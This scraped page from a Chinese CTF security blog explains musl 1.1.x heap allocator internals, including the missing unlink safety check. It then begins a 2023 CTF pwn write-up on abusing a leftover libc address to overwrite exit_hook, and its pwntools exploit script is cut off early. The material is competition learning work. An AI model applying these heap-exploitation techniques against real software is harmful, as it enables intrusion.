class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/22/musl%201.1.x%20%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8%E5%88%9D%E6%8E%A2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/09/22/musl%201.1.x%20%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8%E5%88%9D%E6%8E%A2/" class="post-title-link" itemprop="url">musl 1.1.x 堆分配器初探</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-09-22 21:50:59 / Modified: 21:52:06" itemprop="dateCreated datePublished" datetime="2023-09-22T21:50:59+08:00">2023-09-22</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Libc-Musl-简析"><a href="#Libc-Musl-简析" class="headerlink" title="Libc Musl 简析"></a>Libc Musl 简析</h2><p>Musl 是一个轻量级的C标准库，设计作为 GNU C library (glibc)、 uClibc 或 Android Bionic 的替代用于嵌入式操作系统和移动设备</p>
<p>它遵循 POSIX 2008 规格和 C99 标准，采用 MIT 许可证授权，使用 Musl 的 Linux 发行版和项目包括 <code>sabotage</code>， <code>bootstrap-linux</code>， <code>LightCube OS</code> 等</p>
<h2 id="Libc-Musl-堆管理器-1-1-x"><a href="#Libc-Musl-堆管理器-1-1-x" class="headerlink" title="Libc Musl 堆管理器 - 1.1.x"></a>Libc Musl 堆管理器 - 1.1.x</h2><p>1.1.x 和 1.2.x 堆管理结构几乎完全不同：</p>
<img src="/2023/09/22/musl%201.1.x%20%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8%E5%88%9D%E6%8E%A2/1678206958466.png" class width="1678206958466">  
<ul>
<li>1.2.x 新版本使用 mallocng</li>
<li>1.1.x 旧版本使用 oidmalloc</li>
</ul>
<p><strong>1.1.x Musl 关键结构体</strong></p>
<p>基础堆块结构体 chunk：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> psize, csize; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>psize 和 csize 字段都有标志位，但只有最低位的标志位 INUSE 有效（该标记用于表示自己的状态）<ul>
<li>若设置 INUSE 标志位（最低位为1），表示 chunk 正在被使用</li>
<li>若没有设置 INUSE 标志位（最低位为0），表示 chunk 已经被释放或者通过 mmap 分配的，需要通过 psize 的标志位来进一步判断 chunk 的状态</li>
</ul>
</li>
</ul>
<p>核心结构体 mal：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">uint64_t</span> binmap;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bin</span> <span class="title">bins</span>[64];</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> free_lock[<span class="number">2</span>];</span><br><span class="line">&#125; mal;</span><br></pre></td></tr></table></figure>
<ul>
<li>64 位无符号整数 binmap，记录每个 bin 是否为非空 </li>
<li>前面 32 个 bin 存放的 chunk 大小固定，而后面的存放一定范围的 chunk</li>
</ul>
<p>空闲循环链表 bin：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bin</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> lock[<span class="number">2</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">head</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">tail</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>head 和 tail 指针分别指向首部和尾部的 chunk</li>
<li>首部 chunk 的 prev 指针和尾部 chunk 的 next 指针指向 bin 链表头部</li>
</ul>
<p><strong>1.1.x Musl 关键函数</strong></p>
<p>申请函数 malloc：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">c</span>;</span></span><br><span class="line">	<span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (adjust_size(&amp;n) &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">/* 对齐 */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (n &gt; MMAP_THRESHOLD) &#123; <span class="comment">/* 使用mmap */</span></span><br><span class="line">		<span class="keyword">size_t</span> len = n + OVERHEAD + PAGE_SIZE - <span class="number">1</span> &amp; -PAGE_SIZE;</span><br><span class="line">		<span class="keyword">char</span> *base = __mmap(<span class="number">0</span>, len, PROT_READ|PROT_WRITE,</span><br><span class="line">			MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (base == (<span class="keyword">void</span> *)<span class="number">-1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		c = (<span class="keyword">void</span> *)(base + SIZE_ALIGN - OVERHEAD);</span><br><span class="line">		c-&gt;csize = len - (SIZE_ALIGN - OVERHEAD);</span><br><span class="line">		c-&gt;psize = SIZE_ALIGN - OVERHEAD;</span><br><span class="line">		<span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	i = bin_index_up(n); <span class="comment">/* 计算该chunk所属的bin */</span></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="keyword">uint64_t</span> mask = mal.binmap &amp; -(<span class="number">1ULL</span>&lt;&lt;i); <span class="comment">/* 通过binmap查找bin中是否有free chunk */</span></span><br><span class="line">		<span class="keyword">if</span> (!mask) &#123; <span class="comment">/* 查找失败 */</span></span><br><span class="line">			c = expand_heap(n); <span class="comment">/* 扩展堆空间 */</span></span><br><span class="line">			<span class="keyword">if</span> (!c) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span> (alloc_rev(c)) &#123;</span><br><span class="line">				<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">x</span> =</span> c;</span><br><span class="line">				c = PREV_CHUNK(c);</span><br><span class="line">				NEXT_CHUNK(x)-&gt;psize = c-&gt;csize =</span><br><span class="line">					x-&gt;csize + CHUNK_SIZE(c);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125; <span class="comment">/* 查找成功 */</span></span><br><span class="line">		j = first_set(mask); <span class="comment">/* 获取bin */</span></span><br><span class="line">		lock_bin(j);</span><br><span class="line">		c = mal.bins[j].head;</span><br><span class="line">		<span class="keyword">if</span> (c != BIN_TO_CHUNK(j)) &#123; <span class="comment">/* 若大小不合适,则使用pretrim进行分割 */</span></span><br><span class="line">			<span class="keyword">if</span> (!pretrim(c, n, i, j)) unbin(c, j);</span><br><span class="line">			unlock_bin(j);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		unlock_bin(j);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Now patch up in case we over-allocated */</span></span><br><span class="line">	trim(c, n); <span class="comment">/* 最后malloc会将没有使用的内存释放(这一点会破坏堆风水) */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>unlink 操作函数 unbin：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unbin</span><span class="params">(struct chunk *c, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">		a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span>&lt;&lt;i));</span><br><span class="line">	c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">	c-&gt;next-&gt;prev = c-&gt;prev;</span><br><span class="line">	c-&gt;csize |= C_INUSE;</span><br><span class="line">	NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 libc 中会有 <code>c-&gt;prev-&gt;next == c &amp;&amp; c-&gt;next-&gt;prev == c</code> 的检查，而这里没有</li>
</ul>
<p>释放函数 free：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">self</span> =</span> MEM_TO_CHUNK(p);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (IS_MMAPPED(self))</span><br><span class="line">		unmap_chunk(self);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		__bin_chunk(self);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __bin_chunk(struct chunk *self)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span> =</span> NEXT_CHUNK(self);</span><br><span class="line">	<span class="keyword">size_t</span> final_size, new_size, size;</span><br><span class="line">	<span class="keyword">int</span> reclaim=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	final_size = new_size = CHUNK_SIZE(self);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Crash on corrupted footer (likely from buffer overflow) */</span></span><br><span class="line">	<span class="keyword">if</span> (next-&gt;psize != self-&gt;csize) a_crash();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE) &#123;</span><br><span class="line">			self-&gt;csize = final_size | C_INUSE;</span><br><span class="line">			next-&gt;psize = final_size | C_INUSE;</span><br><span class="line">			i = bin_index(final_size);</span><br><span class="line">			lock_bin(i);</span><br><span class="line">			lock(mal.free_lock);</span><br><span class="line">			<span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			unlock(mal.free_lock);</span><br><span class="line">			unlock_bin(i);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (alloc_rev(self)) &#123; <span class="comment">/* 向前合并空闲chunk */</span></span><br><span class="line">			self = PREV_CHUNK(self);</span><br><span class="line">			size = CHUNK_SIZE(self);</span><br><span class="line">			final_size += size;</span><br><span class="line">			<span class="keyword">if</span> (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)</span><br><span class="line">				reclaim = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (alloc_fwd(next)) &#123; <span class="comment">/* 向后合并空闲chunk */</span></span><br><span class="line">			size = CHUNK_SIZE(next);</span><br><span class="line">			final_size += size;</span><br><span class="line">			<span class="keyword">if</span> (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)</span><br><span class="line">				reclaim = <span class="number">1</span>;</span><br><span class="line">			next = NEXT_CHUNK(next);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(mal.binmap &amp; <span class="number">1ULL</span>&lt;&lt;i)) <span class="comment">/* 在binmap中设置非空 */</span></span><br><span class="line">		a_or_64(&amp;mal.binmap, <span class="number">1ULL</span>&lt;&lt;i);</span><br><span class="line"></span><br><span class="line">	self-&gt;csize = final_size;</span><br><span class="line">	next-&gt;psize = final_size;</span><br><span class="line">	unlock(mal.free_lock);</span><br><span class="line"></span><br><span class="line">	self-&gt;next = BIN_TO_CHUNK(i); <span class="comment">/* 将self插入到链表的尾部 */</span></span><br><span class="line">	self-&gt;prev = mal.bins[i].tail;</span><br><span class="line">	self-&gt;next-&gt;prev = self;</span><br><span class="line">	self-&gt;prev-&gt;next = self;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Replace middle of large chunks with fresh zero pages */</span></span><br><span class="line">	<span class="keyword">if</span> (reclaim) &#123;</span><br><span class="line">		<span class="keyword">uintptr_t</span> a = (<span class="keyword">uintptr_t</span>)self + SIZE_ALIGN+PAGE_SIZE<span class="number">-1</span> &amp; -PAGE_SIZE;</span><br><span class="line">		<span class="keyword">uintptr_t</span> b = (<span class="keyword">uintptr_t</span>)next - SIZE_ALIGN &amp; -PAGE_SIZE;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 1</span></span><br><span class="line">		__madvise((<span class="keyword">void</span> *)a, b-a, MADV_DONTNEED);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">		__mmap((<span class="keyword">void</span> *)a, b-a, PROT_READ|PROT_WRITE,</span><br><span class="line">			MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	unlock_bin(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>1.1.x Musl 堆排布</strong></p>
<p>在堆初始化之后，程序会自动生成一个基于 libc 基地址的 chunk 和一个基于程序基地址的 chunk</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p /x mal</span><br><span class="line">$<span class="number">3</span> = &#123;</span><br><span class="line">  binmap = <span class="number">0x4000000000</span>,</span><br><span class="line">  bins = &#123;&#123;</span><br><span class="line">      lock = &#123;<span class="number">0x0</span>, <span class="number">0x0</span>&#125;,</span><br><span class="line">      head = <span class="number">0x0</span>,</span><br><span class="line">      tail = <span class="number">0x0</span></span><br><span class="line">    &#125; &lt;repeats <span class="number">38</span> times&gt;, &#123;</span><br><span class="line">      lock = &#123;<span class="number">0x0</span>, <span class="number">0x0</span>&#125;,</span><br><span class="line">      head = <span class="number">0x6021f0</span>,</span><br><span class="line">      tail = <span class="number">0x7f02cb591350</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">      lock = &#123;<span class="number">0x0</span>, <span class="number">0x0</span>&#125;,</span><br><span class="line">      head = <span class="number">0x0</span>,</span><br><span class="line">      tail = <span class="number">0x0</span></span><br><span class="line">    &#125; &lt;repeats <span class="number">25</span> times&gt;&#125;,</span><br><span class="line">  free_lock = &#123;<span class="number">0x0</span>, <span class="number">0x0</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>最开始申请的堆都会从这两个 chunk 中切割，直到有更合适的 chunk 出现</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/22/%E7%BE%8A%E5%9F%8E%E6%9D%AFCTF2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/09/22/%E7%BE%8A%E5%9F%8E%E6%9D%AFCTF2023/" class="post-title-link" itemprop="url">羊城杯CTF2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-09-22 21:48:53 / Modified: 21:50:44" itemprop="dateCreated datePublished" datetime="2023-09-22T21:48:53+08:00">2023-09-22</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>28k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>26 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="easy-vm"><a href="#easy-vm" class="headerlink" title="easy_vm"></a>easy_vm</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.23</span><span class="number">-0u</span>buntu11)</span> stable release version 2.23, by Roland McGrath et al.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">26</span>ed58f813bfbb711bf498f43d760c8ba0fcaf53, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，NX，PIE</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>本程序没有明显的漏洞，是利用程序提供的机制进行入侵：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="built_in">malloc</span>(<span class="number">0x1000</span>uLL);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line">ptr = <span class="number">0LL</span>;</span><br><span class="line">data = <span class="built_in">malloc</span>(<span class="number">0x1000</span>uLL);</span><br><span class="line">code = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>uLL);</span><br></pre></td></tr></table></figure>
<ul>
<li>程序的这一波操作会将 libc_addr 遗留在 data 中</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5645cca65010</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rax <span class="number">0x5645cca65010</span> —▸ <span class="number">0x7f354ef32b78</span> —▸ <span class="number">0x5645cca67050</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x5645cca65018</span> —▸ <span class="number">0x7f354ef32b78</span> —▸ <span class="number">0x5645cca67050</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x5645cca65020</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>核心思路就是利用 data 中遗留的 libc_addr 打 exit_hook，对于 exit_hook 的位置可以使用以下方法进行查找：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt;  p rtld_lock_default_lock_recursive</span><br><span class="line">$<span class="number">1</span> = &#123;<span class="keyword">void</span> (<span class="keyword">void</span> *)&#125; <span class="number">0x7f354ef38c90</span> &lt;rtld_lock_default_lock_recursive&gt;</span><br><span class="line">pwndbg&gt; search -t qword <span class="number">0x7f354ef38c90</span></span><br><span class="line">Searching <span class="keyword">for</span> value: b<span class="number">&#x27;</span>\x90\x8c\xf3N5\x7f\x00\x00<span class="number">&#x27;</span></span><br><span class="line">warning: Unable to access <span class="number">16000</span> bytes of target memory at <span class="number">0x7f354ed35d07</span>, halting search.</span><br><span class="line">ld<span class="number">-2.23</span>.so      <span class="number">0x7f354f15ef48</span> <span class="number">0x7f354ef38c90</span></span><br><span class="line">pwndbg&gt; distance <span class="number">0x7f354f15ef48</span> <span class="number">0x7f354eb6e000</span></span><br><span class="line"><span class="number">0x7f354f15ef48</span>-&gt;<span class="number">0x7f354eb6e000</span> is <span class="number">-0x5f0f48</span> bytes (<span class="number">-0xbe1e9</span> words)</span><br></pre></td></tr></table></figure>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = 